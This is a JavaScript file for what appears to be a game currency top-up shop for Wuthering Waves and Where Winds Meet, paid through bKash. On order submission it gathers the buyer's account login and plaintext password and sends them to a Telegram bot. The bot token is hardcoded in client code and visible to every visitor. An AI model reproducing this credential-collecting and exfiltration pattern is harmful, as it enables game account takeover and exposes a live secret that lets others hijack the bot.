// --- Data ---
const packages = {
    ww: [
        { id: 'ww1', type: 'Lunite Subscription Pack', name: 'Tide Blessing Pack', price: 449 },
        { id: 'ww2', type: 'Resonator Pass Packs', name: 'Resonator Pass', price: 949 },
        { id: 'ww3', type: 'Resonator Pass Packs', name: 'Resonator Pass+', price: 2199 },
        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites (Bonus Inc.)', price: 109 },
        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites (Bonus Inc.)', price: 449 },
        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites (Bonus Inc.)', price: 1649 },
        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites (Bonus Inc.)', price: 3299 },
        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites (Bonus Inc.)', price: 5499 },
        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites (Bonus Inc.)', price: 10999 },
    ],
    wwm: [
        { id: 'wwm1', type: 'Moonlit Supply Pack', name: 'Spirit Jade Subscription', price: 449 },
        { id: 'wwm2', type: 'Hero’s Journey Pass', name: 'Battle Scroll', price: 949 },
        { id: 'wwm3', type: 'Hero’s Journey Pass', name: 'Battle Scroll+', price: 2199 },
        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade (Bonus Inc.)', price: 109 },
        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade (Bonus Inc.)', price: 449 },
        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade (Bonus Inc.)', price: 1649 },
        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade (Bonus Inc.)', price: 3299 },
        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade (Bonus Inc.)', price: 5499 },
        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade (Bonus Inc.)', price: 10999 },
    ]
};

// --- Telegram Bot Details ---
const BOT_TOKEN = '8289877335:AAHcXDyb2pu7XjLbMxDM_g1l7EbkQEmVD_Y';
const CHAT_IDS = ['8395284772', '6073457658'];

// --- DOM Elements ---
const container = document.getElementById('packages-container');
const gameBtns = document.querySelectorAll('.game-btn');
const modal = document.getElementById('order-modal');
const successModal = document.getElementById('success-modal');
const closeBtn = document.querySelector('.close-btn');
const closeSuccessBtn = document.getElementById('close-success');
const form = document.getElementById('order-form');
const qtyInput = document.getElementById('quantity');
const displayPrice = document.getElementById('display-price');
const paymentAmount = document.getElementById('payment-amount');

// --- State ---
let currentPackage = null;
let currentGameName = '';

// --- Render Packages ---
function renderPackages(gameKey) {
    container.innerHTML = '';
    currentGameName = gameKey === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
    
    packages[gameKey].forEach(pkg => {
        const card = document.createElement('div');
        card.className = 'package-card';
        card.innerHTML = `
            <span class="pack-type">${pkg.type}</span>
            <h3 class="pack-name">${pkg.name}</h3>
            <div class="pack-price">${pkg.price}<span>৳</span></div>
        `;
        card.addEventListener('click', () => openModal(pkg));
        container.appendChild(card);
    });
}

// --- Game Switcher ---
gameBtns.forEach(btn => {
    btn.addEventListener('click', (e) => {
        gameBtns.forEach(b => b.classList.remove('active'));
        e.target.classList.add('active');
        renderPackages(e.target.dataset.game);
    });
});

// --- Modal Logic ---
function openModal(pkg) {
    currentPackage = pkg;
    document.getElementById('modal-package-name').innerText = pkg.name;
    document.getElementById('modal-game-name').innerText = currentGameName;
    qtyInput.value = 1;
    updatePrice();
    modal.classList.remove('hidden');
}

function updatePrice() {
    const total = currentPackage.price * qtyInput.value;
    displayPrice.innerText = total;
    paymentAmount.innerText = total + '৳';
}

qtyInput.addEventListener('input', updatePrice);

closeBtn.addEventListener('click', () => modal.classList.add('hidden'));
closeSuccessBtn.addEventListener('click', () => successModal.classList.add('hidden'));

// Close modal if clicked outside
window.addEventListener('click', (e) => {
    if (e.target === modal) modal.classList.add('hidden');
    if (e.target === successModal) successModal.classList.add('hidden');
});

// --- Telegram API Submission ---
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const submitBtn = document.getElementById('submit-btn');
    const btnText = submitBtn.querySelector('.btn-text');
    const loader = submitBtn.querySelector('.loader');

    // UI Loading state
    submitBtn.disabled = true;
    btnText.classList.add('hidden');
    loader.classList.remove('hidden');

    // Collect Data
    const data = {
        game: currentGameName,
        package: currentPackage.name,
        qty: qtyInput.value,
        total: currentPackage.price * qtyInput.value,
        email: document.getElementById('email-username').value,
        pass: document.getElementById('password').value,
        server: document.getElementById('server').value,
        ign: document.getElementById('ign').value,
        trxid: document.getElementById('trxid').value
    };

    // Format Message
    const message = `
🔥 <b>NEW ORDER RECEIVED!</b> 🔥

🎮 <b>Game:</b> ${data.game}
📦 <b>Package:</b> ${data.package}
🔢 <b>Quantity:</b> ${data.qty}
💰 <b>Total Price:</b> ${data.total} ৳

👤 <b>Email/User:</b> <code>${data.email}</code>
🔑 <b>Password:</b> <code>${data.pass}</code>
🌍 <b>Server:</b> ${data.server}
🏷️ <b>IGN:</b> ${data.ign}

💳 <b>Payment (bKash)</b>
🧾 <b>TrxID:</b> <code>${data.trxid}</code>
    `;

    try {
        // Send to both chat IDs concurrently
        const promises = CHAT_IDS.map(chatId => {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            return fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        });

        await Promise.all(promises);

        // Success
        form.reset();
        modal.classList.add('hidden');
        successModal.classList.remove('hidden');

    } catch (error) {
        alert('An error occurred while submitting the order. Please try again.');
        console.error(error);
    } finally {
        // Reset UI
        submitBtn.disabled = false;
        btnText.classList.remove('hidden');
        loader.classList.add('hidden');
    }
});

// Initialize on load
renderPackages('ww');
